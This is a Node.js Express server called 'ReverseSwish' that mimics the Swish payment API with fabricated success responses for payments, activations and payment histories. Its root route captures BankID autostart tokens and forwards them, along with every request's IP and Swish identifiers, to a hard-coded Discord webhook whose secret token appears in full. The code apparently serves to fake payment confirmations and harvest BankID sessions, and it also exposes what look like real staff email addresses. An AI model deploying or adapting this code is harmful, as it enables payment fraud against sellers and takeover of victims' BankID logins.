 // Import packages
 const express = require("express");
 const axios = require("axios");
 
 const app = express();
 
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1252955031750311946/M9E0m6o7hH7K9TyQhimNOn3HECIw7k_PS6v3bfpnQoGBWHQZU7ZgO1TaWEGATcarOjyo";
 let MSID = ""
 let AMOUNT = ""
 
 app.use(express.json());
 
 app.get('/', (req, res) => {
  // Extract the query parameters from req.query
  const { autostarttoken, redirect } = req.query;

  if (!autostarttoken || !redirect) {
    return res.status(400).send('Query parameters "autostarttoken" and "redirect" are required.');
  }

  // Log the query parameters to console or webhook
  sendDiscordWebhook(`autostarttoken: ${autostarttoken}, redirect: ${redirect}`);

  // Construct the redirect URL
  const redirectUrl = `bankid:///?autostarttoken=${autostarttoken}&redirect=${redirect}`;

  // Redirect to the constructed URL
  res.redirect(redirectUrl);
});



 
   // Function to send Discord webhook
 async function sendDiscordWebhookEmbed(embed) {
   try {
     await axios.post(DISCORD_WEBHOOK_URL, { embeds: [embed] });
     console.log("Embedded Webhook sent successfully");
   } catch (error) {
     console.error("Error sending webhook:", error);
   }
 }
 
 async function sendDiscordWebhook(msg) {
   try {
     await axios.post(DISCORD_WEBHOOK_URL, { content: msg });
     console.log("Webhook sent successfully");
   } catch (error) {
     console.error("Error sending webhook:", error);
   }
 }
 
 
 
 
 // Middleware to send a Discord webhook for every request
 app.use(async (req, res, next) => {
   try {
 
     const ipAddress = req.headers['x-forwarded-for'];
     const hash = req.headers['hash'];
     const alias = req.headers['swish-alias'];
     const clienttime = req.headers['clienttime'];
 
     const embedMessage = {
       title: 'New Request Details',
       description: 'A new request has been made.',
       color: 16711680, // Red color (decimal)
       fields: [
         { name: 'Vercel IP', value: ipAddress, inline: true },
         { name: 'Swish Hash', value: hash, inline: true },
         { name: 'Swish Alias', value: alias, inline: true },
         { name: 'Swish CTime', value: clienttime, inline: true },
         { name: 'BankID Verified', value: bankid, inline: true },
 
       ],
       footer: { text: 'ReSwish IOS | Version (0.0.1)' }
     };
 
 
     await sendDiscordWebhookEmbed(embedMessage);
   } catch (error) {
     console.error('Error processing request:', error);
   }
   next();
 });
 // Endpoints
 
 app.post("/mpc-swish/api/v4/initiatepayment", async (req, res) => {
   res.status(200).send('{"autoStartToken":"deadb33f-cdb6-4df3-8de0-deadb33f","result":"200","paymentID":"DEADB33F"}');
   });
   
 app.get("/mpc-swish/api/v1/blocks/", (req, res) => {
   res.status(200).send('{"time":"2024-06-19T13:38:01.122+00:00","block":[]}');
 });
 
 app.get("/mpc-swish/api/v4/paymenthistory/100/INCOMING/0/100/", (req, res) => {
   res.status(200).send('{"result":"200","bankIdOrderReference":null,"dateTimeOfSearch":null,"endOfSearch":true,"item":[{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST USER","businessName":null,"alias":"46700000000"},"message":"This is an example message.","orderId":null,"paymentType":"P2P","gift":{"themeId":"sallad1"},"birPaymentId":"123123123","paymentDirection":"INCOMING","bankPaymentReference":"123123123","dateTime":"2019-04-01T11:56:23"},{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST USER","businessName":null,"alias":"46700000000"},"message":"This is an example message.","orderId":null,"paymentType":"P2P","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-04-01T11:55:06"},{"paymentChannel":"CPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST COMPANY AB","businessName":null,"alias":"46700000000"},"message":"","orderId":"","paymentType":"REFUND","gift":null,"birPaymentId":"123123123","paymentDirection":"INCOMING","bankPaymentReference":"123123123","dateTime":"2019-03-29T14:52:01"},{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST COMPANY AB","businessName":null,"alias":"1230000000"},"message":"","orderId":"123123123","paymentType":"COMMERCE","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-03-29T14:51:40"},{"paymentChannel":"MPC","amount":"5.00","currency":"SEK","payerPayee":{"name":"TEST COMPANY AB","businessName":null,"alias":"1230000000"},"message":"test","orderId":"123123123","paymentType":"COMMERCE","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-03-29T14:47:56"},{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST USER","businessName":null,"alias":"46700000000"},"message":"","orderId":null,"paymentType":"P2P","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-04-01T11:56:23"},{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST USER","businessName":null,"alias":"46700000000"},"message":"","orderId":null,"paymentType":"P2P","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-04-01T11:55:06"},{"paymentChannel":"CPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST COMPANY AB","businessName":null,"alias":"46700000000"},"message":"","orderId":"","paymentType":"REFUND","gift":null,"birPaymentId":"123123123","paymentDirection":"INCOMING","bankPaymentReference":"123123123","dateTime":"2019-03-29T14:52:01"},{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST COMPANY AB","businessName":null,"alias":"1230000000"},"message":"","orderId":"123123123","paymentType":"COMMERCE","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-03-29T14:51:40"},{"paymentChannel":"MPC","amount":"5.00","currency":"SEK","payerPayee":{"name":"TEST COMPANY AB","businessName":null,"alias":"1230000000"},"message":"test","orderId":"123123123","paymentType":"COMMERCE","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-03-29T14:47:56"}],"autoStartToken":null}');
 });
 
 app.get("/mpc-swish/api/v4/paymenthistory/100/ALL/0/100/", (req, res) => {
   res.status(200).send('{"result":"200","bankIdOrderReference":null,"dateTimeOfSearch":null,"endOfSearch":true,"item":[{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST USER","businessName":null,"alias":"46700000000"},"message":"This is an example message.","orderId":null,"paymentType":"P2P","gift":{"themeId":"sallad1"},"birPaymentId":"123123123","paymentDirection":"INCOMING","bankPaymentReference":"123123123","dateTime":"2019-04-01T11:56:23"},{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST USER","businessName":null,"alias":"46700000000"},"message":"This is an example message.","orderId":null,"paymentType":"P2P","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-04-01T11:55:06"},{"paymentChannel":"CPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST COMPANY AB","businessName":null,"alias":"46700000000"},"message":"","orderId":"","paymentType":"REFUND","gift":null,"birPaymentId":"123123123","paymentDirection":"INCOMING","bankPaymentReference":"123123123","dateTime":"2019-03-29T14:52:01"},{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST COMPANY AB","businessName":null,"alias":"1230000000"},"message":"","orderId":"123123123","paymentType":"COMMERCE","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-03-29T14:51:40"},{"paymentChannel":"MPC","amount":"5.00","currency":"SEK","payerPayee":{"name":"TEST COMPANY AB","businessName":null,"alias":"1230000000"},"message":"test","orderId":"123123123","paymentType":"COMMERCE","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-03-29T14:47:56"},{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST USER","businessName":null,"alias":"46700000000"},"message":"","orderId":null,"paymentType":"P2P","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-04-01T11:56:23"},{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST USER","businessName":null,"alias":"46700000000"},"message":"","orderId":null,"paymentType":"P2P","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-04-01T11:55:06"},{"paymentChannel":"CPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST COMPANY AB","businessName":null,"alias":"46700000000"},"message":"","orderId":"","paymentType":"REFUND","gift":null,"birPaymentId":"123123123","paymentDirection":"INCOMING","bankPaymentReference":"123123123","dateTime":"2019-03-29T14:52:01"},{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST COMPANY AB","businessName":null,"alias":"1230000000"},"message":"","orderId":"123123123","paymentType":"COMMERCE","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-03-29T14:51:40"},{"paymentChannel":"MPC","amount":"5.00","currency":"SEK","payerPayee":{"name":"TEST COMPANY AB","businessName":null,"alias":"1230000000"},"message":"test","orderId":"123123123","paymentType":"COMMERCE","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-03-29T14:47:56"}],"autoStartToken":null}');
 });
 
 app.get("/mpc-swish/api/v4/paymenthistory/100/OUTGOING/0/100/", (req, res) => {
   res.status(200).send('{"result":"200","bankIdOrderReference":null,"dateTimeOfSearch":null,"endOfSearch":true,"item":[{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST USER","businessName":null,"alias":"46700000000"},"message":"This is an example message.","orderId":null,"paymentType":"P2P","gift":{"themeId":"sallad1"},"birPaymentId":"123123123","paymentDirection":"INCOMING","bankPaymentReference":"123123123","dateTime":"2019-04-01T11:56:23"},{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST USER","businessName":null,"alias":"46700000000"},"message":"This is an example message.","orderId":null,"paymentType":"P2P","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-04-01T11:55:06"},{"paymentChannel":"CPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST COMPANY AB","businessName":null,"alias":"46700000000"},"message":"","orderId":"","paymentType":"REFUND","gift":null,"birPaymentId":"123123123","paymentDirection":"INCOMING","bankPaymentReference":"123123123","dateTime":"2019-03-29T14:52:01"},{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST COMPANY AB","businessName":null,"alias":"1230000000"},"message":"","orderId":"123123123","paymentType":"COMMERCE","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-03-29T14:51:40"},{"paymentChannel":"MPC","amount":"5.00","currency":"SEK","payerPayee":{"name":"TEST COMPANY AB","businessName":null,"alias":"1230000000"},"message":"test","orderId":"123123123","paymentType":"COMMERCE","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-03-29T14:47:56"},{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST USER","businessName":null,"alias":"46700000000"},"message":"","orderId":null,"paymentType":"P2P","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-04-01T11:56:23"},{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST USER","businessName":null,"alias":"46700000000"},"message":"","orderId":null,"paymentType":"P2P","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-04-01T11:55:06"},{"paymentChannel":"CPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST COMPANY AB","businessName":null,"alias":"46700000000"},"message":"","orderId":"","paymentType":"REFUND","gift":null,"birPaymentId":"123123123","paymentDirection":"INCOMING","bankPaymentReference":"123123123","dateTime":"2019-03-29T14:52:01"},{"paymentChannel":"MPC","amount":"1.00","currency":"SEK","payerPayee":{"name":"TEST COMPANY AB","businessName":null,"alias":"1230000000"},"message":"","orderId":"123123123","paymentType":"COMMERCE","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-03-29T14:51:40"},{"paymentChannel":"MPC","amount":"5.00","currency":"SEK","payerPayee":{"name":"TEST COMPANY AB","businessName":null,"alias":"1230000000"},"message":"test","orderId":"123123123","paymentType":"COMMERCE","gift":null,"birPaymentId":"123123123","paymentDirection":"OUTGOING","bankPaymentReference":"123123123","dateTime":"2019-03-29T14:47:56"}],"autoStartToken":null}');
 });
 
 app.get("/mpc-swish/api/v1/paymentrequest/findByRoleAndState", (req, res) => {
   res.status(200).send('{"data":[{"id":"2dcfdaa5-416f-49c6-84ed-337a09d4157f","state":"CONFIRMED","amount":"1","currency":"SEK","senderName":"Person 194711026924","senderAlias":"4670000000","receiverName":"Marianne Essen Nordlander","receiverAlias":"4670000001","message":"Sent, CONFIRMED","deniedMessage":null,"viewed":false,"initiatedAt":"2019-12-17T12:53:37.281Z","confirmedAt":"2019-12-17T12:53:41.089Z","cancelledAt":null,"deniedAt":null,"deletedAt":null,"updatedAt":"2019-12-17T12:53:41.089Z","expiredAt":"2020-02-15T12:53:41.089Z"},{"id":"1a038af1-ea57-4f55-853c-3a9fa9ca245e","state":"DENIED","amount":"2","currency":"SEK","senderName":"Person 194711026924","senderAlias":"4670000000","receiverName":"Marianne Essen Nordlander","receiverAlias":"4670000001","message":"Sent, DENIED","deniedMessage":"","viewed":true,"initiatedAt":"2019-11-22T09:42:20.209Z","confirmedAt":"2019-11-22T09:42:23.475Z","cancelledAt":null,"deniedAt":"2019-12-10T09:35:46.381Z","deletedAt":null,"updatedAt":"2019-12-10T09:35:46.381Z","expiredAt":"2020-01-21T09:42:23.475Z"},{"id":"0760b5c9-ad26-4ea0-8e5f-4d8db8afc4c8","state":"CONFIRMED","amount":"3","currency":"SEK","receiverName":"Person 194711026924","receiverAlias":"4670000000","senderName":"Marianne Essen Nordlander","senderAlias":"4670000001","message":"Received, CONFIRMED","deniedMessage":"","viewed":true,"initiatedAt":"2019-11-22T09:42:05.243Z","confirmedAt":"2019-11-22T09:42:09.130Z","cancelledAt":null,"deniedAt":"2019-12-10T09:35:46.322Z","deletedAt":null,"updatedAt":"2019-12-10T09:35:46.322Z","expiredAt":"2020-01-21T09:42:09.130Z"},{"id":"603e81e5-5303-4428-ae54-271fc81c63b1","state":"DENIED","amount":"4","currency":"SEK","senderName":"Person 194711026924","senderAlias":"4670000000","receiverName":"Person 194711119554","receiverAlias":"46703936936","message":"","deniedMessage":"","viewed":true,"initiatedAt":"2019-12-03T13:34:43.614Z","confirmedAt":"2019-12-03T13:34:46.834Z","cancelledAt":null,"deniedAt":"2019-12-03T14:20:35.867Z","deletedAt":null,"updatedAt":"2019-12-03T14:20:35.867Z","expiredAt":"2020-02-01T13:34:46.834Z"},{"id":"1a343821-f3bb-443c-83a6-b9a0833a4c8b","state":"CANCELLED","amount":"5","currency":"SEK","senderName":"Marianne Essen Nordlander","senderAlias":"4670000001","receiverName":"Person 194711026924","receiverAlias":"4670000000","message":"","deniedMessage":null,"viewed":false,"initiatedAt":"2019-11-22T10:02:14.894Z","confirmedAt":"2019-11-22T10:02:18.050Z","cancelledAt":"2019-11-22T10:10:10.639Z","deniedAt":null,"deletedAt":null,"updatedAt":"2019-11-22T10:10:10.639Z","expiredAt":"2020-01-21T10:02:18.050Z"},{"id":"1871f549-df09-4e9c-bd85-3c82f2139c81","state":"DENIED","amount":"8","currency":"SEK","senderName":"Person 194711026924","senderAlias":"4670000000","receiverName":"Marianne Essen Nordlander","receiverAlias":"4670000001","message":"åtta","deniedMessage":"","viewed":false,"initiatedAt":"2019-11-22T09:43:17.454Z","confirmedAt":"2019-11-22T09:43:20.599Z","cancelledAt":null,"deniedAt":"2019-11-22T09:51:47.469Z","deletedAt":null,"updatedAt":"2019-11-22T09:51:47.469Z","expiredAt":"2020-01-21T09:43:20.599Z"},{"id":"6967fc74-706a-4a93-baef-419ec44ba22d","state":"DENIED","amount":"10","currency":"SEK","senderName":"Person 194711026924","senderAlias":"4670000000","receiverName":"Marianne Essen Nordlander","receiverAlias":"4670000001","message":"tio","deniedMessage":"nej tack","viewed":false,"initiatedAt":"2019-11-22T09:43:48.275Z","confirmedAt":"2019-11-22T09:45:09.269Z","cancelledAt":null,"deniedAt":"2019-11-22T09:47:32.518Z","deletedAt":null,"updatedAt":"2019-11-22T09:47:32.518Z","expiredAt":"2020-01-21T09:45:09.269Z"},{"id":"bf34d038-34e6-41a2-825b-2b95e3556762","state":"CONFIRMED","amount":"4","currency":"SEK","senderName":"Person 194711026924","senderAlias":"4670000000","receiverName":"Marianne Essen Nordlander","receiverAlias":"4670000001","message":"fyra","deniedMessage":null,"viewed":false,"initiatedAt":"2019-11-22T09:41:32.070Z","confirmedAt":"2019-11-22T09:41:35.035Z","cancelledAt":null,"deniedAt":null,"deletedAt":null,"updatedAt":"2019-11-22T09:41:35.035Z","expiredAt":"2020-01-21T09:41:35.035Z"},{"id":"bf34d038-34e6-41a2-825b-2b95e3556762","state":"CONFIRMED","amount":"4","currency":"SEK","receiverName":"Person 194711026924","receiverAlias":"4670000000","senderName":"Marianne Essen Nordlander","senderAlias":"4670000001","message":"fyra","deniedMessage":null,"viewed":false,"initiatedAt":"2019-11-22T09:41:32.070Z","confirmedAt":"2019-11-22T09:41:35.035Z","cancelledAt":null,"deniedAt":null,"deletedAt":null,"updatedAt":"2019-11-22T09:41:35.035Z","expiredAt":"2020-01-21T09:41:35.035Z"},{"id":"86eace84-8fd7-4a96-957f-11f1fbb4aabf","state":"CONFIRMED","amount":"3","currency":"SEK","senderName":"Person 194711026924","senderAlias":"4670000000","receiverName":"Marianne Essen Nordlander","receiverAlias":"4670000001","message":"tre","deniedMessage":null,"viewed":false,"initiatedAt":"2019-11-22T09:41:00.779Z","confirmedAt":"2019-11-22T09:41:03.995Z","cancelledAt":null,"deniedAt":null,"deletedAt":null,"updatedAt":"2019-11-22T09:41:03.995Z","expiredAt":"2020-01-21T09:41:03.995Z"},{"id":"86eace84-8fd7-4a96-957f-11f1fbb4aabf","state":"CONFIRMED","amount":"3","currency":"SEK","senderName":"Person 194711026924","senderAlias":"4670000000","receiverName":"Marianne Essen Nordlander","receiverAlias":"4670000001","message":"tre","deniedMessage":null,"viewed":false,"initiatedAt":"2019-11-22T09:41:00.779Z","confirmedAt":"2019-11-22T09:41:03.995Z","cancelledAt":null,"deniedAt":null,"deletedAt":null,"updatedAt":"2019-11-22T09:41:03.995Z","expiredAt":"2020-01-21T09:41:03.995Z"},{"id":"b0c62b84-d026-4753-8b3f-a1b99470f7b1","state":"CANCELLED","amount":"58","currency":"SEK","senderName":null,"senderAlias":"4670000001","receiverName":null,"receiverAlias":"4670000000","message":"thanks for letting you go to work","deniedMessage":null,"viewed":false,"initiatedAt":"2019-10-03T11:09:52.896Z","confirmedAt":"2019-10-03T11:09:59.069Z","cancelledAt":"2019-10-03T11:10:15.870Z","deniedAt":null,"deletedAt":null,"updatedAt":"2019-10-03T11:10:15.870Z","expiredAt":"2019-12-02T11:09:59.069Z"},{"id":"5f85a136-fae8-4d44-ad15-a3525684d0df","state":"DENIED","amount":"5","currency":"SEK","senderName":null,"senderAlias":"4670000000","receiverName":null,"receiverAlias":"4670000001","message":"","deniedMessage":"yes I want to refrain","viewed":false,"initiatedAt":"2019-10-02T13:44:58.396Z","confirmedAt":"2019-10-02T13:45:12.432Z","cancelledAt":null,"deniedAt":"2019-10-03T10:00:49.470Z","deletedAt":null,"updatedAt":"2019-10-03T10:00:49.470Z","expiredAt":"2019-12-01T13:45:12.432Z"},{"id":"52c43cfb-575e-41b7-8b99-3fa9c6d9a82a","state":"DENIED","amount":"5","currency":"SEK","senderName":null,"senderAlias":"4670000000","receiverName":null,"receiverAlias":"4670000001","message":"","deniedMessage":"","viewed":false,"initiatedAt":"2019-10-02T13:50:11.577Z","confirmedAt":"2019-10-02T13:50:14.939Z","cancelledAt":null,"deniedAt":"2019-10-02T13:50:22.936Z","deletedAt":null,"updatedAt":"2019-10-02T13:50:22.936Z","expiredAt":"2019-12-01T13:50:14.939Z"},{"id":"f510cd9e-9f55-44d6-97c4-c326f29e63a8","state":"DENIED","amount":"5","currency":"SEK","senderName":null,"senderAlias":"4670000000","receiverName":null,"receiverAlias":"4670000001","message":"","deniedMessage":"","viewed":false,"initiatedAt":"2019-10-02T13:48:29.327Z","confirmedAt":"2019-10-02T13:48:32.014Z","cancelledAt":null,"deniedAt":"2019-10-02T13:48:45.270Z","deletedAt":null,"updatedAt":"2019-10-02T13:48:45.270Z","expiredAt":"2019-12-01T13:48:32.014Z"},{"id":"621213e0-a5fa-4c5c-bff0-8dc574fdb47f","state":"CANCELLED","amount":"5","currency":"SEK","senderName":null,"senderAlias":"4670000001","receiverName":null,"receiverAlias":"4670000000","message":"","deniedMessage":null,"viewed":false,"initiatedAt":"2019-10-02T12:18:58.201Z","confirmedAt":"2019-10-02T12:19:25.986Z","cancelledAt":"2019-10-02T12:19:46.736Z","deniedAt":null,"deletedAt":null,"updatedAt":"2019-10-02T12:19:46.736Z","expiredAt":"2019-12-01T12:19:25.986Z"}],"time":"2019-12-17T13:17:08.188+0000"}');
 });
 
 app.get("/mpc-swish/api/v2/validation/", (req, res) => {
   res.status(200).send('{"result":"200","brandingId":"NDEASE","brandingVersion":"2","timeToLive":300000,"pushMessageCount":0}');
 });
 
 app.get("/apputils-swish/api/v1/favorite", (req, res) => {
   res.status(200).send('{"result":"200","favorites":[{"alias":"12312312312","nickname":"RevSwish Support"}]}');
 });
 
 // ExecutePayment Endpoint
 
 app.post("/mpc-swish/api/v3/initiateactivation/:param1/:param2", (req, res) => {
   res.status(200).send('{"result":"200","autoStartToken":"9e83a6c0-d8bb-428b-b99b-3a59340c57c7"}');
 });
 
 app.post("/mpc-swish/api/v3/executeactivation/", (req, res) => {
   res.status(200).send('{"result":"200","deviceId":"DEADBEEF","brandingId":"NDEASE","brandingVersion":"2","timeToLive":300000}');
 });
 
 app.post("/mpc-swish/api/v3/executepayment/:param1", (req, res) => {
     res.status(200).json('{"result":"200","amount":"1.00","currency":"USD","payeeName":"TEST USER","payeeBusinessName":null}');
 });
 
 // Badgecount Endpoints
 app.get("/mpc-swish/api/v2/badgecount/", (req, res) => {
   res.status(200).send('{"result":"200","payments":1}');
 });
 
 app.get("/mpc-swish/api/v1/paymentrequest/badgecount", (req, res) => {
   res.status(200).send(
     '{"data":{"pprInfo":1,"pprRequiresAction":0},"time":"2024-06-18T12:07:37.587+00:00"}',
   );
 });
 
 // Consents Endpoint
 app.get("/mpc-swish/consents/v1/detailed-notifications/info", (req, res) => {
   res.status(200).send(
     '{"requestReference":"028C557A57064DBC80810213A6320561","devicePublicKey":"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0KzjRPBgtWPFpHYjLE9HK4gfwYXnKpkuL3mNUXgjJvzUTZdBSgV9f2T5cEbiPLQcgifGymtfdjZ4Gt9syoHsqaDIbxjx0bd05T4h26gQtNEfGuhFy6uXMvgKP3PFP5paYzKUJHi+yTFlaSZnKEUrlCu5D2kOqTz6cv5NISUJH0u1H7kesckhdQT7cfEPNdjYnbImrXLZ9P3+3E0UxApEmztwm0lDCHFS0tjgX2Yh4hjxx/tCCk1BMu/HXdYne66DzkOmv63YeAXrR+3VluhgCsj5j576UK6lWgEunsV8/QV0HzjXM/ne2IEsbuceITdSKgcxPfvVW79JafdK0BipWwIDAQAB","version":"2i","optInDate":"2024-06-18T12:07:23.164+00:00","validDays":90}',
   );
 });
 app.get("/v1/issues/active?channel=appPrivate", (req, res) => {
   res.status(200).send(
     '[{"id":"7fb409c1-a704-42ee-9a33-a0304f9cf893","resolved_at":null,"type":"DOWNTIME","ends_at":null,"created_by":{"at":1573760671379,"email":"helena.timm@bontouch.com"},"starts_at":1573408806000,"target":{"service":"all","bank":"","provider":"swish","supplier":""},"updates":[],"publish_at":1573758006000,"updated_by":{"email":"helena.timm@bontouch.com","at":1573761948676},"channels":[{"data":{"message":"1","title":"Driftstopp"},"name":"appPrivate"}]},{"id":"76148aad-aa49-49c3-ae76-6334c6929c06","created_by":{"email":"hendrik.stjernstrom@bontouch.com","at":1573485984711},"starts_at":1573485936144,"target":{"service":"all","provider":"bank"},"updates":[],"publish_at":1573485936144,"channels":[{"data":{"message":"2","title":"H"},"name":"appPrivate"}],"resolved_at":null,"type":"DISTURBANCE","ends_at":null},{"id":"da4129be-1ca3-412b-824d-95ec5a48143b","ends_at":null,"created_by":{"at":1573544574430,"email":"hendrik.stjernstrom@bontouch.com"},"starts_at":1573544544003,"target":{"service":"all","bank":"Handelsbanken","provider":"bank"},"updates":[],"publish_at":1573544544003,"channels":[{"name":"appPrivate","data":{"title":"","message":"3"}}],"resolved_at":null,"type":"DISTURBANCE"},{"id":"73435caa-9183-4df1-9177-4604fb28509a","created_by":{"at":1573634479014,"email":"hendrik.stjernstrom@bontouch.com"},"starts_at":1573634382799,"target":{"provider":"swish","service":"all","bank":""},"updates":[],"publish_at":1573634382799,"channels":[{"data":{"message":"4","title":""},"name":"appPrivate"}],"resolved_at":null,"type":"DISTURBANCE","ends_at":null},{"id":"d4cf7692-cb33-4325-882d-e2289469cb51","target":{"provider":"supplier","supplier":"bankgirot","service":"all","bank":""},"updates":[],"publish_at":1573746470100,"channels":[{"data":{"message":"5","title":"Hendrik"},"name":"appPrivate"}],"resolved_at":null,"type":"DISTURBANCE","ends_at":null,"created_by":{"email":"hendrik.stjernstrom@bontouch.com","at":1573746506835},"starts_at":1573746470100}]',
   );
 });
 // PaymentRequest Endpoints
 app.get("/mpc-swish/api/v1/paymentrequest/viewSetting", (req, res) => {
   res.status(200).send(
     '{"data":{"privatePaymentRequest":true,"requireParentalConsent":false},"time":"2024-05-23T17:08:25.261+00:00"}',
   );
 });
 // Endpoint for initiating payment requests
 let userID = 0;
 
 // Endpoint for initiating payment requests
 app.post("/mpc-swish/api/v1/paymentrequest/initiatePaymentRequest", (req, res) => {
   // Increment the id for each request
   userID++;
 
   // Prepare the response JSON
   const responseData = {
     data: {
       id: `${userID}`, // Generating an ID with a prefix and the incremented number
       state: "completed",
       senderName: "Test",
       amount: "100.00",
       currency: "USD",
       receiverName: "Test",
       initiatedAt: "2024-06-19T12:00:00Z",
       updatedAt: "2024-06-19T12:05:00Z"
     },
     time: "2024-06-19T12:05:30Z"
   };
 
   // Send the response with incremented id
   res.status(200).json(responseData);
 });
 
 app.get("/mpc-swish/api/v3/paymentrequest/ecom/check/:num", (req, res) => {
   res.status(200).send(
     '{"result":"200","checkInfo":{"status":"NOT_FOUND","mechanism":"longpolling","clientTimeOut":25,"secondsUntilNextRequest":3}}',
   );
 });
 
 
 app.use((req, res, next) => {
   const err = new Error('Not Found');
   err.status = 404;
   next(err); // Passes control to the error handling middleware
 });
 
 // Error handling middleware for 404 errors
 app.use((err, req, res, next) => {
   if (err.status === 404) {
       res.status(200).send(
     '{"result":"200","message":null}',
   );
   } else {
     next(err); // Passes control to the default error handler for other errors
   }
 });
 
 app.listen(3000, () => {
   console.log("ReverseSwish is running on port 3000!");
 });
 ;
 